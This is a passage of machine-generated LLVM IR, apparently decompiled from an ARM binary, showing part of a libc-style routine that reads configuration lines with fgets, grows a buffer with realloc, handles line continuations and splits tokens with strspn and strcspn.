  br i1 %v2_15be4, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_15be0
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_15be0, align 4
  %v0_15bf4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_15be0, %bb
  %v0_15bf4 = phi i32 [ %v0_15bf4.pre, %bb ], [ %v3_15be8, %dec_label_pc_15be0 ]
  %v2_15bf4 = icmp eq i32 %v0_15bf4, 0
  store i1 %v2_15bf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15bf4, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_15ba0, i32* %r3.global-to-local, align 4
  %v2_15bfc = load i32, i32* @r5, align 4
  %v3_15bfc = add i32 %v2_15bfc, 8
  %v4_15bfc = inttoptr i32 %v3_15bfc to i32*
  store i32 %v1_15ba0, i32* %v4_15bfc, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_15c00 = load i32, i32* @r5, align 4
  %v1_15c00 = add i32 %v0_15c00, 16
  %v2_15c00 = inttoptr i32 %v1_15c00 to i32*
  %v3_15c00 = load i32, i32* %v2_15c00, align 4
  store i32 %v3_15c00, i32* %r0.global-to-local, align 4
  %v1_15c04 = add i32 %v0_15c00, 8
  %v2_15c04 = inttoptr i32 %v1_15c04 to i32*
  %v3_15c04 = load i32, i32* %v2_15c04, align 4
  store i32 %v3_15c04, i32* %r3.global-to-local, align 4
  %v2_15c08 = add i32 %v3_15c04, %v3_15c00
  store i32 %v2_15c08, i32* @r0, align 4
  %v0_15c0c = call i32 @malloc()
  store i32 %v0_15c0c, i32* %r0.global-to-local, align 4
  %v2_15c10 = icmp eq i32 %v0_15c0c, 0
  store i1 %v2_15c10, i1* %cpsr_z.global-to-local, align 1
  %v1_15c14 = load i32, i32* @r5, align 4
  %v2_15c14 = add i32 %v1_15c14, 4
  %v3_15c14 = inttoptr i32 %v2_15c14 to i32*
  store i32 %v0_15c0c, i32* %v3_15c14, align 4
  br i1 %v2_15c10, label %dec_label_pc_15e84, label %dec_label_pc_15c1c

dec_label_pc_15c1c:                               ; preds = %.thread
  %v0_15c1c = load i32, i32* @r5, align 4
  %v1_15c1c = add i32 %v0_15c1c, 20
  %v2_15c1c = inttoptr i32 %v1_15c1c to i32*
  %v3_15c1c = load i32, i32* %v2_15c1c, align 4
  %v1_15c20 = or i32 %v3_15c1c, 1
  store i32 %v1_15c20, i32* %r3.global-to-local, align 4
  store i32 %v1_15c20, i32* %v2_15c1c, align 4
  %v0_15c28.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15c28

dec_label_pc_15c28:                               ; preds = %dec_label_pc_15bd4, %dec_label_pc_15c1c
  %v1_15c30 = phi i32 [ %v2_15bf0, %dec_label_pc_15bd4 ], [ %v0_15c28.pre, %dec_label_pc_15c1c ]
  %v1_15c28 = add i32 %v1_15c30, 4
  %v2_15c28 = inttoptr i32 %v1_15c28 to i32*
  %v3_15c28 = load i32, i32* %v2_15c28, align 4
  store i32 %v3_15c28, i32* %r2.global-to-local, align 4
  %v4_15c28 = add i32 %v1_15c30, 8
  %v5_15c28 = inttoptr i32 %v4_15c28 to i32*
  %v6_15c28 = load i32, i32* %v5_15c28, align 4
  %v2_15c2c = add i32 %v6_15c28, %v3_15c28
  store i32 %v2_15c2c, i32* %r3.global-to-local, align 4
  %v2_15c30 = add i32 %v1_15c30, 12
  %v3_15c30 = inttoptr i32 %v2_15c30 to i32*
  store i32 %v2_15c2c, i32* %v3_15c30, align 4
  %v0_15c34 = load i32, i32* @fp, align 4
  store i32 %v0_15c34, i32* @r6, align 4
  br label %dec_label_pc_15c38

dec_label_pc_15c38:                               ; preds = %dec_label_pc_15cc4, %dec_label_pc_15cb0, %dec_label_pc_15c28
  %v0_15c40 = phi i32 [ %v0_15c34, %dec_label_pc_15c28 ], [ %v1_15cb0, %dec_label_pc_15cb0 ], [ %v0_15c40.pre.pre, %dec_label_pc_15cc4 ]
  %v0_15c38 = load i32, i32* @r5, align 4
  %v1_15c38 = add i32 %v0_15c38, 12
  store i32 %v1_15c38, i32* %r0.global-to-local, align 4
  %v1_15c3c = inttoptr i32 %v1_15c38 to i32*
  %v2_15c3c = load i32, i32* %v1_15c3c, align 4
  store i32 %v2_15c3c, i32* %r0.global-to-local, align 4
  %v3_15c3c = add i32 %v0_15c38, 16
  %v4_15c3c = inttoptr i32 %v3_15c3c to i32*
  %v5_15c3c = load i32, i32* %v4_15c3c, align 4
  %v2_15c40 = add i32 %v2_15c3c, %v0_15c40
  store i32 %v2_15c40, i32* %r0.global-to-local, align 4
  %v2_15c44 = sub i32 %v5_15c3c, %v0_15c40
  %v1_15c48 = inttoptr i32 %v0_15c38 to i32*
  %v2_15c48 = load i32, i32* %v1_15c48, align 4
  store i32 %v2_15c48, i32* %r2.global-to-local, align 4
  %v3_15c4c = call i32 @fgets(i32 %v2_15c40, i32 %v2_15c44, i32 %v2_15c48)
  store i32 %v3_15c4c, i32* %r0.global-to-local, align 4
  store i32 %v3_15c4c, i32* %r4.global-to-local, align 4
  %v2_15c50 = icmp eq i32 %v3_15c4c, 0
  store i1 %v2_15c50, i1* %cpsr_z.global-to-local, align 1
  %v0_15c58 = load i32, i32* @r5, align 4
  %v1_15c58 = add i32 %v0_15c58, 12
  br i1 %v2_15c50, label %dec_label_pc_15c58, label %dec_label_pc_15c70

dec_label_pc_15c58:                               ; preds = %dec_label_pc_15c38
  store i32 %v1_15c58, i32* %r0.global-to-local, align 4
  %v1_15c5c = inttoptr i32 %v1_15c58 to i32*
  %v2_15c5c = load i32, i32* %v1_15c5c, align 4
  store i32 %v2_15c5c, i32* %r0.global-to-local, align 4
  %v3_15c5c = add i32 %v0_15c58, 16
  %v4_15c5c = inttoptr i32 %v3_15c5c to i32*
  %v5_15c5c = load i32, i32* %v4_15c5c, align 4
  store i32 %v5_15c5c, i32* %r2.global-to-local, align 4
  %v3_15c64 = inttoptr i32 %v2_15c5c to i8*
  %v4_15c64 = call i32 @__GI_memset(i8* %v3_15c64, i32 0, i32 %v5_15c5c)
  store i32 %v4_15c64, i32* %r0.global-to-local, align 4
  %v0_15c68 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15e88

dec_label_pc_15c70:                               ; preds = %dec_label_pc_15c38
  %v2_15c70 = inttoptr i32 %v1_15c58 to i32*
  %v3_15c70 = load i32, i32* %v2_15c70, align 4
  store i32 %v3_15c70, i32* @r4, align 4
  %v1_15c74 = load i32, i32* @r6, align 4
  %v2_15c74 = add i32 %v1_15c74, %v3_15c70
  %v3_15c74 = inttoptr i32 %v2_15c74 to i8*
  store i32 %v2_15c74, i32* %r0.global-to-local, align 4
  %v3_15c78 = call i32 @strlen(i8* %v3_15c74)
  %v0_15c80 = load i32, i32* @r6, align 4
  %v2_15c80 = add i32 %v0_15c80, %v3_15c78
  store i32 %v2_15c80, i32* @r6, align 4
  %v0_15c84 = load i32, i32* @r4, align 4
  store i32 %v0_15c84, i32* @r0, align 4
  %v2_15c88 = call i32 @__GI_strchr(i32 %v0_15c84, i32 10)
  store i32 %v2_15c88, i32* %r0.global-to-local, align 4
  %v2_15c8c = icmp eq i32 %v2_15c88, 0
  store i1 %v2_15c8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c8c, label %dec_label_pc_15cb8, label %dec_label_pc_15c94

dec_label_pc_15c94:                               ; preds = %dec_label_pc_15c70
  %v1_15c94 = inttoptr i32 %v2_15c88 to i8*
  %v2_15c94 = load i8, i8* %v1_15c94, align 1
  %v3_15c94 = zext i8 %v2_15c94 to i32
  %v1_15c98 = add nuw nsw i32 %v3_15c94, 255
  %v1_15c9c = urem i32 %v1_15c98, 256
  store i32 %v1_15c9c, i32* %r3.global-to-local, align 4
  %v7_15ca0 = icmp eq i32 %v1_15c9c, 92
  store i1 %v7_15ca0, i1* %cpsr_z.global-to-local, align 1
  %v1_15ca4 = trunc i32 %v1_15c98 to i8
  store i8 %v1_15ca4, i8* %v1_15c94, align 1
  %v0_15ca8 = load i32, i32* @r6, align 4
  %v1_15ca8 = add i32 %v0_15ca8, -1
  store i32 %v1_15ca8, i32* @r6, align 4
  %v0_15cac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15cac, label %dec_label_pc_15cb0, label %dec_label_pc_15d3c

dec_label_pc_15cb0:                               ; preds = %dec_label_pc_15c94
  %v1_15cb0 = add i32 %v0_15ca8, -2
  store i32 %v1_15cb0, i32* @r6, align 4
  br label %dec_label_pc_15c38

dec_label_pc_15cb8:                               ; preds = %dec_label_pc_15c70
  %v0_15cb8 = load i32, i32* @r5, align 4
  %v1_15cb8 = add i32 %v0_15cb8, 20
  %v2_15cb8 = inttoptr i32 %v1_15cb8 to i32*
  %v3_15cb8 = load i32, i32* %v2_15cb8, align 4
  store i32 %v3_15cb8, i32* %r3.global-to-local, align 4
  %v2_15cbc = icmp eq i32 %v3_15cb8, 0
  store i1 %v2_15cbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15cbc, label %dec_label_pc_15cf4, label %dec_label_pc_15cc4

dec_label_pc_15cc4:                               ; preds = %dec_label_pc_15cb8
  %v1_15cc4 = add i32 %v0_15cb8, 16
  %v2_15cc4 = inttoptr i32 %v1_15cc4 to i32*
  %v3_15cc4 = load i32, i32* %v2_15cc4, align 4
  store i32 %v3_15cc4, i32* %r3.global-to-local, align 4
  %v1_15cc8 = add i32 %v0_15cb8, 8
  %v2_15cc8 = inttoptr i32 %v1_15cc8 to i32*
  %v3_15cc8 = load i32, i32* %v2_15cc8, align 4
  %v1_15ccc = add i32 %v3_15cc4, 4096
  store i32 %v1_15ccc, i32* %r3.global-to-local, align 4
  %v2_15cd0 = add i32 %v3_15cc8, %v1_15ccc
  store i32 %v1_15ccc, i32* %v2_15cc4, align 4
  %v0_15cd8 = load i32, i32* @r5, align 4
  %v1_15cd8 = add i32 %v0_15cd8, 4
  %v2_15cd8 = inttoptr i32 %v1_15cd8 to i32*
  %v3_15cd8 = load i32, i32* %v2_15cd8, align 4
  store i32 %v3_15cd8, i32* %r0.global-to-local, align 4
  %v4_15cdc = inttoptr i32 %v3_15cd8 to i32*
  %v5_15cdc = call i32 @realloc(i32* %v4_15cdc, i32 %v2_15cd0, i32 %v2_15c48, i32 %v1_15ccc)
  store i32 %v5_15cdc, i32* %r0.global-to-local, align 4
  %v0_15ce0 = load i32, i32* @r5, align 4
  %v1_15ce0 = add i32 %v0_15ce0, 8
  %v2_15ce0 = inttoptr i32 %v1_15ce0 to i32*
  %v3_15ce0 = load i32, i32* %v2_15ce0, align 4
  %v2_15ce4 = add i32 %v3_15ce0, %v5_15cdc
  store i32 %v2_15ce4, i32* %r3.global-to-local, align 4
  %v2_15ce8 = add i32 %v0_15ce0, 12
  %v3_15ce8 = inttoptr i32 %v2_15ce8 to i32*
  store i32 %v2_15ce4, i32* %v3_15ce8, align 4
  %v1_15cec = load i32, i32* @r5, align 4
  %v2_15cec = add i32 %v1_15cec, 4
  %v3_15cec = inttoptr i32 %v2_15cec to i32*
  store i32 %v5_15cdc, i32* %v3_15cec, align 4
  %v0_15c40.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15c38

dec_label_pc_15cf4:                               ; preds = %dec_label_pc_15cb8, %.dec_label_pc_15cf4_crit_edge
  %v0_15cf4 = phi i32 [ %v0_15cf4.pre, %.dec_label_pc_15cf4_crit_edge ], [ %v0_15cb8, %dec_label_pc_15cb8 ]
  %v1_15cf4 = inttoptr i32 %v0_15cf4 to i32*
  %v2_15cf4 = load i32, i32* %v1_15cf4, align 4
  store i32 %v2_15cf4, i32* @r1, align 4
  %v1_15cf8 = add i32 %v2_15cf4, 52
  %v2_15cf8 = inttoptr i32 %v1_15cf8 to i32*
  %v3_15cf8 = load i32, i32* %v2_15cf8, align 4
  store i32 %v3_15cf8, i32* %r3.global-to-local, align 4
  %v2_15cfc = icmp eq i32 %v3_15cf8, 0
  store i1 %v2_15cfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15cfc, label %dec_label_pc_15d28, label %dec_label_pc_15d04

dec_label_pc_15d04:                               ; preds = %dec_label_pc_15cf4
  %v1_15d04 = add i32 %v2_15cf4, 16
  %v2_15d04 = inttoptr i32 %v1_15d04 to i32*
  %v3_15d04 = load i32, i32* %v2_15d04, align 4
  store i32 %v3_15d04, i32* %r2.global-to-local, align 4
  %v1_15d08 = add i32 %v2_15cf4, 24
  %v2_15d08 = inttoptr i32 %v1_15d08 to i32*
  %v3_15d08 = load i32, i32* %v2_15d08, align 4
  store i32 %v3_15d08, i32* %r3.global-to-local, align 4
  %v3_15d0c = icmp ult i32 %v3_15d04, %v3_15d08
  %v9_15d0c = icmp eq i32 %v3_15d04, %v3_15d08
  store i1 %v9_15d0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15d0c, label %dec_label_pc_15d30thread-pre-split, label %dec_label_pc_15d1c

dec_label_pc_15d1c:                               ; preds = %dec_label_pc_15d04
  store i32 %v2_15cf4, i32* %r0.global-to-local, align 4
  %v1_15d20 = inttoptr i32 %v2_15cf4 to i16*
  %v2_15d20 = call i32 @getc_unlocked(i16* %v1_15d20)
  store i32 %v2_15d20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d30

dec_label_pc_15d28:                               ; preds = %dec_label_pc_15cf4
  store i32 %v2_15cf4, i32* %r0.global-to-local, align 4
  %v1_15d2c = call i32 @__GI_fgetc(i32 %v2_15cf4)
  store i32 %v1_15d2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d30

dec_label_pc_15d30thread-pre-split:               ; preds = %dec_label_pc_15d04
  %v2_15d10 = inttoptr i32 %v3_15d04 to i8*
  %v3_15d10 = load i8, i8* %v2_15d10, align 1
  %v4_15d10 = zext i8 %v3_15d10 to i32
  store i32 %v4_15d10, i32* %r0.global-to-local, align 4
  %v6_15d10 = add i32 %v3_15d04, 1
  store i32 %v6_15d10, i32* %r2.global-to-local, align 4
  store i32 %v6_15d10, i32* %v2_15d04, align 4
  %v0_15d30.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d30

dec_label_pc_15d30:                               ; preds = %dec_label_pc_15d30thread-pre-split, %dec_label_pc_15d1c, %dec_label_pc_15d28
  %v1_15d34 = phi i32 [ %v0_15d30.pr, %dec_label_pc_15d30thread-pre-split ], [ %v2_15d20, %dec_label_pc_15d1c ], [ %v1_15d2c, %dec_label_pc_15d28 ]
  %v7_15d30 = icmp eq i32 %v1_15d34, 10
  store i1 %v7_15d30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15d30, label %dec_label_pc_15d3c.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_15d30
  %v8_15d34 = icmp eq i32 %v1_15d34, -1
  store i1 %v8_15d34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_15d34, label %dec_label_pc_15d3c.loopexit, label %.dec_label_pc_15cf4_crit_edge

.dec_label_pc_15cf4_crit_edge:                    ; preds = %bb66
  %v0_15cf4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15cf4

dec_label_pc_15d3c.loopexit:                      ; preds = %bb66, %dec_label_pc_15d30
  %v0_15d3c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15d3c

dec_label_pc_15d3c:                               ; preds = %dec_label_pc_15c94, %dec_label_pc_15d3c.loopexit
  %v0_15d3c = phi i32 [ %v0_15d3c.pre, %dec_label_pc_15d3c.loopexit ], [ %v1_15ca8, %dec_label_pc_15c94 ]
  %v7_15d3c = icmp eq i32 %v0_15d3c, -1
  store i1 %v7_15d3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15d3c, label %dec_label_pc_15e84, label %dec_label_pc_15d44

dec_label_pc_15d44:                               ; preds = %dec_label_pc_15d3c
  store i32 %v1_15bac, i32* %r3.global-to-local, align 4
  store i1 %v2_15d48, i1* %cpsr_z.global-to-local, align 1
  %v0_15d4c = load i32, i32* @r5, align 4
  %v1_15d4c = add i32 %v0_15d4c, 12
  %v2_15d4c = inttoptr i32 %v1_15d4c to i32*
  %v3_15d4c = load i32, i32* %v2_15d4c, align 4
  store i32 %v3_15d4c, i32* @r4, align 4
  br i1 %v2_15d48, label %dec_label_pc_15d64, label %dec_label_pc_15d54

dec_label_pc_15d54:                               ; preds = %dec_label_pc_15d44
  store i32 %v3_15d4c, i32* @r0, align 4
  %v0_15d58 = load i32, i32* @sl, align 4
  %v2_15d5c = inttoptr i32 %v3_15d4c to i8*
  %v3_15d5c = call i32 @__GI_strspn(i8* %v2_15d5c, i32 %v0_15d58)
  store i32 %v3_15d5c, i32* %r0.global-to-local, align 4
  %v0_15d60 = load i32, i32* @r4, align 4
  %v2_15d60 = add i32 %v0_15d60, %v3_15d5c
  store i32 %v2_15d60, i32* @r4, align 4
  br label %dec_label_pc_15d64

dec_label_pc_15d64:                               ; preds = %dec_label_pc_15d44, %dec_label_pc_15d54
  %v0_15d64 = phi i32 [ %v3_15d4c, %dec_label_pc_15d44 ], [ %v2_15d60, %dec_label_pc_15d54 ]
  %v1_15d64 = inttoptr i32 %v0_15d64 to i8*
  %v2_15d64 = load i8, i8* %v1_15d64, align 1
  %v3_15d64 = zext i8 %v2_15d64 to i32
  store i32 %v3_15d64, i32* %r2.global-to-local, align 4
  %v2_15d68 = icmp eq i8 %v2_15d64, 0
  store i1 %v2_15d68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d68, label %dec_label_pc_15bd4.backedge, label %dec_label_pc_15d70

dec_label_pc_15bd4.backedge:                      ; preds = %dec_label_pc_15d64, %dec_label_pc_15d70, %dec_label_pc_15e7c
  %v0_15bd4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15bd4

dec_label_pc_15d70:                               ; preds = %dec_label_pc_15d64
  %v0_15d70 = load i32, i32* @r7, align 4
  %v1_15d70 = inttoptr i32 %v0_15d70 to i8*
  %v2_15d70 = load i8, i8* %v1_15d70, align 1
  %v3_15d70 = zext i8 %v2_15d70 to i32
  store i32 %v3_15d70, i32* %r3.global-to-local, align 4
  %v9_15d74 = icmp eq i8 %v2_15d70, %v2_15d64
  store i1 %v9_15d74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15d74, label %dec_label_pc_15bd4.backedge, label %dec_label_pc_15d7c

dec_label_pc_15d7c:                               ; preds = %dec_label_pc_15d70
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_15d80 = load i32, i32* @r5, align 4
  %v1_15d80 = add i32 %v0_15d80, 4
  %v2_15d80 = inttoptr i32 %v1_15d80 to i32*
  %v3_15d80 = load i32, i32* %v2_15d80, align 4
  store i32 %v3_15d80, i32* %r0.global-to-local, align 4
  %v0_15d84 = load i32, i32* @fp, align 4
  store i32 %v3_15d80, i32* %v1_15da0, align 4
  store i32 %v3_15b98, i32* %r2.global-to-local, align 4
  %v3_15d90 = inttoptr i32 %v3_15d80 to i8*
  %v4_15d90 = call i32 @__GI_memset(i8* %v3_15d90, i32 %v0_15d84, i32 %v3_15b98)
  store i32 %v4_15d90, i32* %r0.global-to-local, align 4
  %v0_15d94 = load i32, i32* @fp, align 4
  store i32 %v0_15d94, i32* @r6, align 4
  %v0_15e5412 = load i32, i32* @r4, align 4
  %v1_15e5413 = inttoptr i32 %v0_15e5412 to i8*
  %v2_15e5414 = load i8, i8* %v1_15e5413, align 1
  %v3_15e5415 = zext i8 %v2_15e5414 to i32
  store i32 %v3_15e5415, i32* %r2.global-to-local, align 4
  %v2_15e5816 = icmp eq i8 %v2_15e5414, 0
  store i1 %v2_15e5816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e5816, label %dec_label_pc_15e70, label %dec_label_pc_15e60

dec_label_pc_15d9c:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_15da0 = load i32, i32* %v1_15da0, align 4
  store i32 %v2_15da0, i32* %r3.global-to-local, align 4
  store i32 %v1_15bb0, i32* %r2.global-to-local, align 4
  %v9_15da8 = icmp eq i32 %v2_15dac, %v1_15bb0
  store i1 %v9_15da8, i1* %cpsr_z.global-to-local, align 1
  %v5_15dac = mul i32 %v2_15dac, 4
  %v6_15dac = add i32 %v2_15da0, %v5_15dac
  %v7_15dac = inttoptr i32 %v6_15dac to i32*
  store i32 %v0_15dac, i32* %v7_15dac, align 4
  br i1 %v9_15da8, label %dec_label_pc_15db4, label %dec_label_pc_15dc0

dec_label_pc_15db4:                               ; preds = %dec_label_pc_15d9c
  store i32 %v1_15bbc, i32* %r3.global-to-local, align 4
  store i1 %v2_15db8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15db8, label %dec_label_pc_15dc0, label %dec_label_pc_15de0

dec_label_pc_15dc0:                               ; preds = %dec_label_pc_15db4, %dec_label_pc_15d9c
  %v0_15dc0 = load i32, i32* @r7, align 4
  %v1_15dc0 = inttoptr i32 %v0_15dc0 to i8*
  %v2_15dc0 = load i8, i8* %v1_15dc0, align 1
  %v3_15dc0 = zext i8 %v2_15dc0 to i32
  store i32 %v3_15dc0, i32* %r3.global-to-local, align 4
  %v2_15dc4 = icmp eq i8 %v2_15dc0, 0
  store i1 %v2_15dc4, i1* %cpsr_z.global-to-local, align 1
  %v0_15dc8 = load i32, i32* @r4, align 4
  store i32 %v0_15dc8, i32* @r0, align 4
  %v1_15dcc = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_15dc4, i32 %v1_15dcc, i32 %v0_15dc0
  store i32 %storemerge, i32* @r1, align 4
  %v0_15dd4 = call i32 @strcspn()
  store i32 %v0_15dd4, i32* %r0.global-to-local, align 4
  %v0_15dd8 = load i32, i32* @r4, align 4
  %v2_15dd8 = add i32 %v0_15dd8, %v0_15dd4
  store i32 %v2_15dd8, i32* @r4, align 4
  br label %dec_label_pc_15e18

dec_label_pc_15de0:                               ; preds = %dec_label_pc_15db4
  %v0_15de0 = load i32, i32* @r4, align 4
  store i32 %v0_15de0, i32* @r0, align 4
  %v0_15de4 = load i32, i32* @r7, align 4
  %v1_15de4 = inttoptr i32 %v0_15de4 to i8*
  %v2_15de4 = load i8, i8* %v1_15de4, align 1
  %v3_15de4 = zext i8 %v2_15de4 to i32
  %v5_15de8 = call i32 @__GI_strchrnul(i32 %v0_15de0, i32 %v3_15de4, i32 %v1_15bb0, i32 %v1_15bbc)
  store i32 %v5_15de8, i32* %r0.global-to-local, align 4
  store i32 %v1_15bac, i32* %r2.global-to-local, align 4
  store i1 %v2_15d48, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_15de8, i32* @r4, align 4
  br i1 %v2_15d48, label %dec_label_pc_15e18, label %dec_label_pc_15e04

dec_label_pc_15e00:                               ; preds = %dec_label_pc_15e04
  %v1_15e00 = add i32 %v0_15e18.pre, -1
  store i32 %v1_15e00, i32* @r4, align 4
  br label %dec_label_pc_15e04

dec_label_pc_15e04:                               ; preds = %dec_label_pc_15de0, %dec_label_pc_15e00
  %v0_15e04 = phi i32 [ %v1_15e00, %dec_label_pc_15e00 ], [ %v5_15de8, %dec_label_pc_15de0 ]
  %v1_15e04 = add i32 %v0_15e04, -1
  %v2_15e04 = inttoptr i32 %v1_15e04 to i8*
  %v3_15e04 = load i8, i8* %v2_15e04, align 1
  %v4_15e04 = zext i8 %v3_15e04 to i32
  %v0_15e08 = load i32, i32* @sl, align 4
  store i32 %v0_15e08, i32* @r0, align 4
  %v2_15e0c = call i32 @__GI_strchr(i32 %v0_15e08, i32 %v4_15e04)
  store i32 %v2_15e0c, i32* %r0.global-to-local, align 4
  %v2_15e10 = icmp eq i32 %v2_15e0c, 0
  store i1 %v2_15e10, i1* %cpsr_z.global-to-local, align 1
  %v0_15e18.pre = load i32, i32* @r4, align 4
  br i1 %v2_15e10, label %dec_label_pc_15e18, label %dec_label_pc_15e00

dec_label_pc_15e18:                               ; preds = %dec_label_pc_15e04, %dec_label_pc_15de0, %dec_label_pc_15dc0
  %v3_15e24 = phi i32 [ %v5_15de8, %dec_label_pc_15de0 ], [ %v2_15dd8, %dec_label_pc_15dc0 ], [ %v0_15e18.pre, %dec_label_pc_15e04 ]
  %v1_15e18 = inttoptr i32 %v3_15e24 to i8*
  %v2_15e18 = load i8, i8* %v1_15e18, align 1
  %v3_15e18 = zext i8 %v2_15e18 to i32
  store i32 %v3_15e18, i32* %r2.global-to-local, align 4
  %v0_15e1c = load i32, i32* @r7, align 4
  %v1_15e1c = inttoptr i32 %v0_15e1c to i8*
  %v2_15e1c = load i8, i8* %v1_15e1c, align 1
  %v3_15e1c = zext i8 %v2_15e1c to i32
  store i32 %v3_15e1c, i32* %r3.global-to-local, align 4
  %v9_15e20 = icmp eq i8 %v2_15e1c, %v2_15e18
  store i1 %v9_15e20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15e20, label %bb69, label %dec_label_pc_15e2c

bb69:                                             ; preds = %dec_label_pc_15e18
  %v1_15e24 = load i32, i32* @fp, align 4
  %v2_15e24 = trunc i32 %v1_15e24 to i8
  store i8 %v2_15e24, i8* %v1_15e18, align 1
  %v0_15e28.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15e28.pr, label %bb71, label %.dec_label_pc_15e2c_crit_edge

.dec_label_pc_15e2c_crit_edge:                    ; preds = %bb69
  %v0_15e2c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15e2c

dec_label_pc_15e2c:                               ; preds = %.dec_label_pc_15e2c_crit_edge, %dec_label_pc_15e18
  %v0_15e2c = phi i32 [ %v0_15e2c.pre, %.dec_label_pc_15e2c_crit_edge ], [ %v3_15e18, %dec_label_pc_15e18 ]
  %v2_15e2c = icmp eq i32 %v0_15e2c, 0
  store i1 %v2_15e2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e2c, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_15e2c
  %v1_15e30 = load i32, i32* @fp, align 4
  %v2_15e30 = trunc i32 %v1_15e30 to i8
  %v3_15e30 = load i32, i32* @r4, align 4
  %v4_15e30 = inttoptr i32 %v3_15e30 to i8*
  store i8 %v2_15e30, i8* %v4_15e30, align 1
  %v5_15e30 = load i32, i32* @r4, align 4
  %v6_15e30 = add i32 %v5_15e30, 1
  store i32 %v6_15e30, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_15e2c, %bb70
  %v2_15e34 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_15e34, i32* %r3.global-to-local, align 4
  %v2_15e38 = icmp eq i32 %v2_15e34, 0
  store i1 %v2_15e38, i1* %cpsr_z.global-to-local, align 1
  %v0_15e54.pre = load i32, i32* @r4, align 4
  br i1 %v2_15e38, label %dec_label_pc_15e50, label %dec_label_pc_15e40

dec_label_pc_15e40:                               ; preds = %bb71
  store i32 %v0_15e54.pre, i32* @r0, align 4
  %v0_15e44 = load i32, i32* @sl, align 4
  %v2_15e48 = inttoptr i32 %v0_15e54.pre to i8*
  %v3_15e48 = call i32 @__GI_strspn(i8* %v2_15e48, i32 %v0_15e44)
  store i32 %v3_15e48, i32* %r0.global-to-local, align 4
  %v0_15e4c = load i32, i32* @r4, align 4
  %v2_15e4c = add i32 %v0_15e4c, %v3_15e48
  store i32 %v2_15e4c, i32* @r4, align 4
  br label %dec_label_pc_15e50

dec_label_pc_15e50:                               ; preds = %bb71, %dec_label_pc_15e40
  %v0_15e54 = phi i32 [ %v2_15e4c, %dec_label_pc_15e40 ], [ %v0_15e54.pre, %bb71 ]
  %v0_15e50 = load i32, i32* @r6, align 4
  %v1_15e50 = add i32 %v0_15e50, 1
  store i32 %v1_15e50, i32* @r6, align 4
  %v1_15e54 = inttoptr i32 %v0_15e54 to i8*
  %v2_15e54 = load i8, i8* %v1_15e54, align 1
  %v3_15e54 = zext i8 %v2_15e54 to i32
  store i32 %v3_15e54, i32* %r2.global-to-local, align 4
  %v2_15e58 = icmp eq i8 %v2_15e54, 0
  store i1 %v2_15e58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e58, label %dec_label_pc_15e70, label %dec_label_pc_15e60

dec_label_pc_15e60:                               ; preds = %dec_label_pc_15d7c, %dec_label_pc_15e50
  %v0_15dac = phi i32 [ %v0_15e54, %dec_label_pc_15e50 ], [ %v0_15e5412, %dec_label_pc_15d7c ]
  %v2_15dac = phi i32 [ %v1_15e50, %dec_label_pc_15e50 ], [ %v0_15d94, %dec_label_pc_15d7c ]
  %v1_15e64 = phi i32 [ %v3_15e54, %dec_label_pc_15e50 ], [ %v3_15e5415, %dec_label_pc_15d7c ]
  %v0_15e60 = load i32, i32* @r7, align 4
  %v1_15e60 = inttoptr i32 %v0_15e60 to i8*
  %v2_15e60 = load i8, i8* %v1_15e60, align 1
  %v3_15e60 = zext i8 %v2_15e60 to i32
  store i32 %v3_15e60, i32* %r3.global-to-local, align 4
  %v9_15e64 = icmp eq i32 %v3_15e60, %v1_15e64
  store i1 %v9_15e64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15e64, label %dec_label_pc_15e70, label %bb72

bb72:                                             ; preds = %dec_label_pc_15e60
  %v2_15e68 = load i32, i32* @sb, align 4
  %v3_15e68 = sub i32 %v2_15dac, %v2_15e68
  %v5_15e68 = xor i32 %v2_15e68, %v2_15dac
  %v6_15e68 = xor i32 %v3_15e68, %v2_15dac
  %v7_15e68 = and i32 %v6_15e68, %v5_15e68
  %v8_15e68 = icmp slt i32 %v7_15e68, 0
  %v9_15e68 = icmp slt i32 %v3_15e68, 0
  %v10_15e68 = icmp eq i32 %v2_15dac, %v2_15e68
